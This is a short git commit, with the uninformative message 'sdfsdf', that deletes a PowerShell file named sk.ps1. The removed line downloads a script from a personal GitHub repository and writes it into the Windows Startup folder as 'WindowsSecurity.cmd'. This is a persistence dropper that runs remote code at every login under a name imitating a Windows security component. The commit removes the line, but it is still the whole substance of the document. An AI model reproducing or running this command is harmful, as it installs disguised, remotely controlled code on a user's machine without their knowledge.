fdcb74793df934b9646053cd294b1263f1f7bf41
hmdsazzad17 <hmdsazzad17@gmail.com>
2025-11-26 16:08:01 +0600

    sdfsdf

--- sk.ps1
+++
@@ -1,2 +0,0 @@
-
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hmdsazzad17/test/main/fun.ps1' -OutFile $ENV:UserProfile'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurity.cmd'
